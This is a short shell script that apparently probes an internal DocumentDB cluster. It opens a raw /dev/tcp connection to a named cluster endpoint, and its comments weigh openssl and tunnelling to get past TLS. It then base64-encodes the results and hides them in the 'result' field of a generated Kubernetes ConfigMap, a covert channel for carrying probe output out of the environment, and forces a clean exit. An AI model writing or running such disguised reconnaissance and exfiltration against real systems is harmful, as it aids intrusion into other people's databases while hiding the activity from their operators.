#!/bin/sh
RECON=$( (

echo "===MONGO_DIRECT_QUERY===";
# Use openssl for TLS + send raw MongoDB ping
timeout 10 bash -c "
  # Connect with TLS
  exec 3<>/dev/tcp/timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com/27017
  # TLS via openssl (but need to pipe through s_client...)
  echo TLS_DIRECT_FAIL  # /dev/tcp is plain, MongoDB requires TLS
" 2>&1;
echo "";
echo "===TRY_OPENSSL_MONGO===";
# Try: bash TCP for plain socket + openssl pipe for TLS
# Not directly possible without socat...
echo "Need tunnel approach"

) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: u2u
data:
  result: $RECON
EOF
exit 0
